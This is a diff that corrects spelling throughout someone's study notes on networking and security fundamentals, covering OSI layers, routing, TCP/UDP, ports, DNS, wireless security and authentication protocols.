@@ -28650,13 +28650,13 @@ ARP Poisoning:
  Layer 3: The Network Layer (Packets)
 Examples of devices: routers and multilayer switches.
 Handles Logical addressing and routing od traffic: uses logical addressing to make forwarding decisions.
-- The lowest layer for protocal software.
+- The lowest layer for protocol software.
 - A variety of routed protocols (like, AppleTalk and IPX) have their own
 logical addressing schemes
 - the most widely deployed routed protocol is Internet Protocol (IP).
-  - IP address: nonpersistent address asigned via software and changed as needed.
-  - IPv4 adress: 32 bits.
-  - IPv6 adress: 128 bits.
+  - IP address: nonpersistent address assigned via software and changed as needed.
+  - IPv4 address: 32 bits.
+  - IPv6 address: 128 bits.
 - A less popular Layer 3 protocol is Novell’s Internetwork Packet Exchange
 (IPX), which has its own format for Layer 3 addressing. (Although Novell developed, most modern Novell networks use IP as their Layer 3 protocol.)
 Switching:
@@ -28720,7 +28720,7 @@ Destinated host not on the same LAN:
 
 ## the gateway.
 The default route:
-  - Route used as a destination for trafic with an underfined route
+  - Route used as a destination for traffic with an undefined route
   - When defined on a host, generally is the network gateway.
 Routers: Gateways and other intermediate network nodes that handle the routing of packets to its destination on the Internet. typically connected
 to two or more LANs, use routing tables to determine the next router which packet should be sent.
@@ -28893,7 +28893,7 @@ Private use:
 networks over the public Internet.
   - only usable on their local subnet and are dynamically assigned to
 network hosts using the Automatic IP Address Assignment (APIPA) feature.
-Public adress:
+Public address:
    ▪
 
 
@@ -29245,7 +29245,7 @@ Subnets / subnetworks
   - leads to inefficient allocation of address.
 - subnet
   - Partitioning large networks:
-  - Seperate the portion if the network bits from the host bits.
+  - Separate the portion if the network bits from the host bits.
 - (add additional network bits to a subnet masks) extending the subnet mask to
 create subnets within a classful network.
 - subnet mask
@@ -29508,7 +29508,7 @@ One ABRs nonbackbone area, from source network to the backbone area, travels cro
 the networks in area 1 (cause all area 1 networks directly connected to R1.)
   - This enables all the area 0 routers learn the cost to reach all networks in area 1. The area border routers then summarize this information and advertise it into the nonbackbone areas. Thus, all routers learn how to reach all networks in the domain.
 Two ABRs in nonbackbone area, need to make a choice which one to use to reach the backbone.
-  - This is easy, R1 and R2 will be advertising different costs to various networks, according to the cost to the detination network, choose by shortest-path algorithm.
+  - This is easy, R1 and R2 will be advertising different costs to various networks, according to the cost to the destination network, choose by shortest-path algorithm.
   - Example, R1 is better choice than R2 for destinations in area 1.  ⁃
 network administrators can flexibly decide routers in backbone area 0.
   - Use virtual link between routers. can help to improve the optimality 最优性 of routing.
@@ -29541,7 +29541,7 @@ Program (negative) ▪
 
 
 ## Program (active)load from hard disk to memory, than become a active process.
-One application one process, each proeess has it own spaces in RAM. Hardware: instrcution + stytem calls.
+One application one process, each proeess has it own spaces in RAM. Hardware: instruction + stytem calls.
 Ram only trade process like data, instructio dont finger out different process.
 Memory Swuoping: If no more memory, OS check the process no run for long time, move in to Virtual memory, if the program active again, it load form virtual memory again.
 Routers
@@ -29863,7 +29863,7 @@ Integrating Interdomain and Intradomain Routing  All routers run iBGP and an int
 ◦ From the entries shown in the routing tables, routers R1 and R2 are
 directly connected routes.
 Static Routing
-Routing table been crated by network administrator.
+Routing table been created by network administrator.
 used mainly on small networks.
 losses utility on larger networks because the manual updates hard to keep it
    ▪
@@ -30559,7 +30559,7 @@ If ( ! final[5] && ( min+dis[1][5] < dis[5] ) ) For w=6;
 {If ( ! final[8] && ( min+dis[1][8] < dis[8] ) ) }
 3.
 Min = infinity;
-For w=2; //求出V0-V2最短路径 { 0 4 < infinity. //0&&ture
+For w=2; //求出V0-V2最短路径 { 0 4 < infinity. //0&&true
 If ( ! final[2] && (*D)[2]<min ). { K=2;min= (*D)[2]=4; } }
 Final[2] = 1
 For w=0; //fianl[0]=1，没有必要 { If ( ! final[0] && ( min+dis[2][0] < dis[0] ) )} //
@@ -30583,7 +30583,7 @@ For w=8; //dis[2][3]=N，不直接和V8相连
 {If ( ! final[8] && ( min+dis[2][8] < dis[8] ) )
 4.
 Min = infinity;
-For w=3; //求出V0-V2最短路径 { 0 8 < infinity. //0&&ture
+For w=3; //求出V0-V2最短路径 { 0 8 < infinity. //0&&true
 If ( ! final[3] && (*D)[3]<min ). { K=3;min= (*D)[3]=8; } }
  Final[3] = 1
 For w=0; //fianl[0]=1，没有必要 { If ( ! final[0] && ( min+dis[3][0] < dis[0] ) )} //
@@ -30773,7 +30773,7 @@ int N, n, m, k, min; int final[N];
 for (n=0; n<MAXVEX; n++;) {
 final[n] = 0; (*d)[N]=G.arc[N][n]; (*P)[N]=0;
 } (*D)[N]==0; final[N]=1;
-    //main loop, choose one start point, caculate the best cost
+    //main loop, choose one start point, calculate the best cost
 min.
 for (n=1; n<MAXVEX; n++;) {
 min=INFINITY;
@@ -31016,7 +31016,7 @@ Establish an ARO (annualized rate of occurrence) Based on history, experience, a
   4 The Transport Layer
 on top of the network layer
 supports communication between machines and processes.
-Reponsible for communication between host computer and verifying that both the sender and receiver are ready to initiate the data transfer.
+Responsible for communication between host computer and verifying that both the sender and receiver are ready to initiate the data transfer.
 - messages are taken from upper layers (Layers 5–7), encapsulated into segments for transmission to the lower layers (Layers 1–3). - data streams coming from lower layers are decapsulated and sent to Layer 5 (the session layer), or some other upper layer, depending on the protocol.
 - Function:
   - the network layer & transport layer: ensure reliability of
@@ -31068,7 +31068,7 @@ the sender times out and retransmits the original frame 4 different scenarios fo
 (b) the original frame is lost; (c) the ACK is lost;
 (d) the timeout fires too soon
  If the acknowledgment is lost or delayed:
-The sender times out and retransmits the frist frame, but the receiver
+The sender times out and retransmits the first frame, but the receiver
 may think that it is the next frame correctly received and
 acknowledged the first frame again.
 Then, duplicate copies of frames will be delivered How to solve this
@@ -31149,11 +31149,11 @@ ACK packet to establish the connection.
    - TCP Features
  - Connection oriented
 - Reliable delivery
-  - provides reliablity by requiring positive acknowledegments of delivery
+  - provides reliability by requiring positive acknowledegments of delivery
 - Maintains order
   - guarantees order with sequence numbers
 - Error checking
-  - privides error checking with checksums TCP session: starts by establishing a communication connection between sender and receiver.
+  - provides error checking with checksums TCP session: starts by establishing a communication connection between sender and receiver.
 - Once connection created, the parties communicate over the established channel.
 - TCP ensures reliable transmission by using sequence number (three-way handshake)
   - Each subsequent transmission features an incremented sequence number,
@@ -31178,7 +31178,7 @@ with traffic
   - This checksum is typically supplemented by an additional checksum at the link layer, such as Ethernet, which uses the CRC-32 checksum.
   - TCP generally checks data transmitted by comparing a checksum of the data with a checksum encoded in the packet  Sliding window protocol:
 - TCP uses it to manage flow control.
-  - Sliding window used by the reciever to slow down the sender
+  - Sliding window used by the receiver to slow down the sender
 - Congestion control: TCP can react to changing network conditions (slow down/ speed up dens rates)
   - Does it by adjust the congestion widonw size of the sender.
   - congestion widonw size used by the sender to reduce the network
@@ -31242,7 +31242,7 @@ Finite, specified in the header field Finite size: 3 bit.
 外面跑得封包.
 1. Stop and wait: 同時在外面跑得
 frame只有1個，只需要1個bit. 2. MaxSeqNum:目前可以使用的
-Seqence number最大值，SWS + 1
+Sequence number最大值，SWS + 1
 ≤ MaxSeqNum
 Is this sufficient? Depends on RWS
 If RWS=1, then sufficient
@@ -31307,7 +31307,7 @@ When design reliable byte-stream protocol that uses a sliding window (like TCP),
 before any delayed segments have left the network, which is
 presumed to occur within the maximum segment lifetime.
 In the protocol header:
-  - It need n bits to demostrate the number (XX),
+  - It need n bits to demonstrate the number (XX),
   - 2^n bits > number
 EffectiveWindow = AdvertisedWindow − (LastByteSent − LastByteAcked)
 If the sending process tries to write y bytes to TCP, but
@@ -31316,7 +31316,7 @@ then TCP blocks the sending process and does not allow it to generate more data.
     - With each packet, the receiver informs the sender Sending Window Size (SWS),(the number of bytes of data it is willing to accept before the sender must pause and wait for a response, indicating the receiver is ready to accept more data.)
   - The sender keeps track the Last Acknowledgement Received (LAR).
   - Sender: checks the sequence number of the packet to be sent, send it if this number is less than Last Acknowledgement Received (LAR) plus Sending Window Size (SWS)
-  - Reciver:
+  - Receiver:
   - If SeqNum ≤ LFR or SeqNum > LAF
   - Discard it (the frame is outside the receiver window)   - If LFR < SeqNum ≤ LAF
   - Accept it
@@ -31389,7 +31389,7 @@ Internet Control Message Protocol Transport layer
 forwarded,
   - from which upper-layer protocol the data is being sent.
 - SequenceNum:
-  - Indentify the position in the segmented data stream
+  - Identify the position in the segmented data stream
   - contains the sequence number for the first byte of data carried in that segment.
   - if segments arrive out of order, the recipient can put them back in the appropriate order.
 - Acknowledgment: ▪
@@ -31506,7 +31506,7 @@ While UDP features a 16-bit checksum to verify the integrity of each individual 
 ## arrive out of order or may not arrive at all.
 It is assumed that checking for missing packets in a sequence of datagrams is left to applications processing these packets.
 As a result, UDP can be much faster than TCP, which often requires retransmissions and delaying of packets.
-Doesn’t gurantee error-free communications. UDP is often used
+Doesn’t guarantee error-free communications. UDP is often used
 in time-sensitive applications where data integrity is not as important as speed
   - Short client-server request like DNS, single message request
   - Voice over IP (VoIP).
@@ -31535,7 +31535,7 @@ UDP:
   - Only one process can be assigned to a port on an IP at a time
   - Port conflict
   - App request a port being used. Simply fail. Uable to open the port.
-Ports are inly unique per address:
+Ports are only unique per address:
 - System can have more then 1 address.
 - Administrators open ports on firewalls and routers to allow the associated protocol into or out of a network.
   - example, HTTP uses port 80, administrator allows HTTP traffic by opening port 80.
@@ -31625,13 +31625,13 @@ Port Port and protocol number
 Protocols aren’t identified by the port, but the protocol numbers: IPsec:
   - protocol number 50: Encapsulating Security Payload (ESP) packet,
   - protocol number 51: Authentication Header (AH) packet. ICMP: protocol number 1, TCP 6, UDP 7.
-Protocol numebr: protocol ID or a protocol identifier.
+Protocol number: protocol ID or a protocol identifier.
 Ports Security
 Routers, and the routing component of firewalls, filter packets based on IP addresses, ports, and some protocols such as ICMP or IPsec.
 Because many protocols use well-known ports, you can control protocol traffic based on the port.
-You can use a protocol numebr to block / allow traffic on router and firewall. Allow IPsec ESP traffic:
+You can use a protocol number to block / allow traffic on router and firewall. Allow IPsec ESP traffic:
   - opening port 50
-  - Allowing reaffic using protocol numebr 50.
+  - Allowing reaffic using protocol number 50.
 Port security: limits the computers that can connect to physical ports on a switch.
 Example:
 disable unused ports.
@@ -32140,7 +32140,7 @@ Anonymous Diffie-Hellman: Anonymous Diffie-Hellman key exchange.
     Ephemeral Diffie-Hellman key exchange: Ephemeral Diffie-Hellman key exchange
  Fixed Diffie-Hellman: Another solution is the fixed Diffie-Hellman method. All entities in a group can prepare fixed Diffie-Hellman parameters (g and p). Fortezza: Fortezza is a registered trademark of the U.S. National Security Agency
    (NSA). It is a family of security protocols developed for the Defense Department.
-17.1.3 Encryption/Decryption Alogrithms
+17.1.3 Encryption/Decryption Algorithms
 NULL: The NULL category simply defines the lack of an encryption/decryption algorithm.
 Stream RC: Two RC algorithms are defined in stream mode.
 Block RC: One RC algorithm is defined in block mode.
@@ -32315,7 +32315,7 @@ design for the exchange of electronic mail between network systems.
 Way to send email:
 1. Mail client software
 2. https
-Sender PC - Mail queue - SMTP Server - Inetrnet (DNS decided msn/gmail/yahoo.com) - Mail queue - POP3 Server - recieved email.
+Sender PC - Mail queue - SMTP Server - Inetrnet (DNS decided msn/gmail/yahoo.com) - Mail queue - POP3 Server - received email.
 Directory Services Use Case
 use a directory service to streamline management and implement security. provide secure access to the network.
 Example:
@@ -32393,7 +32393,7 @@ The primary purpose: domain name resolution. DNS resolves host names to IP addre
 Internal networks can use BIND, but in Microsoft networks, DNS servers commonly use the Microsoft DNS software.
 Zone data is updated with zone transfers
   - secure zone transfers:prevent unauthorized access to zone data
-Occasionally, DNS servers share inofrmation with each other (zone transfer):
+Occasionally, DNS servers share information with each other (zone transfer):
   - Most case, zone transfer only includes a small number of updated records.
   - But some transfers include all the records in the zone.
   - DNS severs:
@@ -32479,7 +32479,7 @@ what type of ICMP packets are you going to allow?
 destination unreachable, and then the codes that fall within that.
 - The others are optional, the type 0, 8, and 11. optional,.
 ICMP packets follow a basic format:
-frist byte of header indicates the type of message.
+first byte of header indicates the type of message.
 the net byte contains the code for each particular type of ICMP;
 an ICMP error message
 - have the IP header, the first eight bytes of the original datagram
@@ -32723,7 +32723,7 @@ Hypertext transfer protocol (HTTP).
 SSL/TLS. This is the protocol used for secure, encrypted browsing (i.e., with
 HTTPS). IMAP/POP/SMTP .
   - These are protocols that make Internet email possible.
-  - Encrpt the login credentials for email client.
+  - Encrypt the login credentials for email client.
 File transfer protocol(FTP).This is an old, but still used, protocol that provides a simple interface for uploading and downloading files. It does not encrypt data during transfer.
 SOAP. This is a more recent protocol for exchanging structured data as a part of the web services paradigm.
 Telnet.
@@ -36192,7 +36192,7 @@ Reverse Proxy
 - It appears to clients as a web server, but is forwarding the requests to the web
 server and serving the pages returned by the web server.
 - reverse proxy server is configured to protect a web server.
-- Benifit: This configuration: allows the web server to be located in the private
+- Benefit: This configuration: allows the web server to be located in the private
 network behind a second firewall.
 Example:
 - Bart wants to access https://gcgapremium.com.
@@ -37038,7 +37038,7 @@ You cannot modify the gain of an antenna without changing its
    ▪
 
 
-## physical propert.
+## physical property.
 But many wireless access points include a power setting that you can manipulate to increase or decrease the
 transmit power.
 Administrators sometimes reduce the power level to
@@ -37233,7 +37233,7 @@ Hackers have cracked WPA2-PSK, but WPA2-Enterprise has not yet been cracked.
 Open mode
 If you select None in Security Options section, the AP will operate in Open mode, doesn’t have any security.
 A third mode
-sometimes called open, unsecure: sometimes for public Wi- Fi that has no access to any sensitive data, simply a portal to access the
+sometimes called open, insecure: sometimes for public Wi- Fi that has no access to any sensitive data, simply a portal to access the
 Internet.
 Example:
     Laptop with wireless signal on but no network: maybe the
@@ -37507,7 +37507,7 @@ Identity and Access Services implementing a VPN: to ensure only authorized entit
 Remote access authentication: used when a user accesses a private network from a
 remote location, such as with a VPN connection.
 VPNs support multiple methods of authentication:
-Password Authentication Protocol (PAP): sends passwords in cleartext, uesd only for last resort.
+Password Authentication Protocol (PAP): sends passwords in cleartext, used only for last resort.
 Challenge Handshake Authentication Protocol (CHAP).
   - uses a handshake process where the server challenges the client.
   - The client then responds with appropriate authentication information. Microsoft CHAP (MS-CHAP).
@@ -37528,7 +37528,7 @@ Terminal Access Controller Access-Control System Plus (TACACS+).
 PAP, SPAP, and CHAP
 These three authentication protocols: represent the evolution of authentication.
 PAP Password Authentication Protocol
-The oldest, primitive and unsecure method of authentication.
+The oldest, primitive and insecure method of authentication.
 is used with Point-to-Point Protocol (PPP) to authenticate clients. Weakness: sends passwords in cleartext, security risk.
 PPP was primarily used with dial-up connections.
   - there was a time when the thought of someone wiretapping a phone was rather remote. Because of this, security was an afterthought with PPP.
@@ -37808,7 +37808,7 @@ LDAP and centralized access control systems can be used to support single sign- 
 Protocol overview
 A client starts an LDAP session by connecting to an LDAP server, called a Directory System Agent (DSA), by default on TCP and UDP port 389, or on port 636 for LDAPS (LDAP over SSL, see below).
 The client then sends an operation request to the server, and a server sends responses in return. With some exceptions, the client does not need to wait for a response before sending the next request, and the server may send the responses in any order. All information is transmitted using Basic
-     X.500 distiguished names
+     X.500 distinguished names
  - Attribute = value pairs
   - CN | Common Name | identifies the person object
   - OU | Organization Unit | a unit or departemnt within the
@@ -40473,7 +40473,7 @@ vulnerability scanning product from Tenable Network Security. features include:
   - Checking system configurations for compliance with an organization’s policy
   - Auditing systems for specific content (like credit-card information or adult content)
   - Performing continuous scanning, reducing time required to identify vulnerability.
-  - Scheduling scans to run once, daily, weekly, or monthly 2 version of Nessus: home / busines.  Nmap
+  - Scheduling scans to run once, daily, weekly, or monthly 2 version of Nessus: home / business.  Nmap
 publicly available scanner features like:
   - Scanning and sweeping 扫除 features, identify services running on systems in a specified range of IP addresses.
   - Using a stealth approach to scanning and sweeping, making the scanning and sweeping less detectible by hosts and IPS technology.
@@ -40563,7 +40563,7 @@ Windows® clients to remotely access to a Microsoft Windows® network. - RDP:
 ◦ a Microsoft protocol that allows a user to view and control the desktop
 of a remote computer.
 ◦ If RDP is misconfigured, a man in the middle attack could occur,
-senstive information being captured.
+sensitive information being captured.
 - PPPoE :
 ◦ Point-to-Point Protocol over Ethernet (PPPoE)
 ◦ a commonly protocol between a DSL modem in home/business and a
@@ -40925,7 +40925,7 @@ smoke..., a contained area)
 - Temperature controlled (too high: overhearts, too low:
 condensation 冷凝) 100F
 - Humidity (high: corrosion 腐蚀, low: static electricity) 20-80
-Meida storage:
+Media storage:
 - Track tape usage by date, Number of uses, Meantime of failure.
 - As close as possible.
 Fire
@@ -40934,7 +40934,7 @@ Fire
 - Location of IT assests.
 - Location and type of fire suppression systems. (Flooding systems,
 handheld extinguisers)
-  - Fire requires: fire trangle: oxygen, heat, fule, trigger,
+  - Fire requires: fire trangle: oxygen, heat, fuel, trigger,
   - Fire suppression:
   - Heat - reduce temperature. (Water)
   - Fuel - remove the source.
@@ -42846,7 +42846,7 @@ To gain a handle on the explosive growth of cryptographic technologies, governme
   - This standard is the basis behind the Skipjack algorithm.
 - Another method is to designate employees within the organization who will be
 responsible for key escrow.
-  - These employees maintain and protect copies of the key, and if the original key is lost, they check out a copy ofthe key to an administrator or user.
+  - These employees maintain and protect copies of the key, and if the original key is lost, they check out a copy of the key to an administrator or user.
 It’s highly unlikely that government regulators will ever overcome the legal and privacy hurdles necessary to implement key escrow on a widespread basis.
 The technology is certainly available, but the general public will likely never accept the potential government intrusiveness it facilitates.
 Recovery Agent
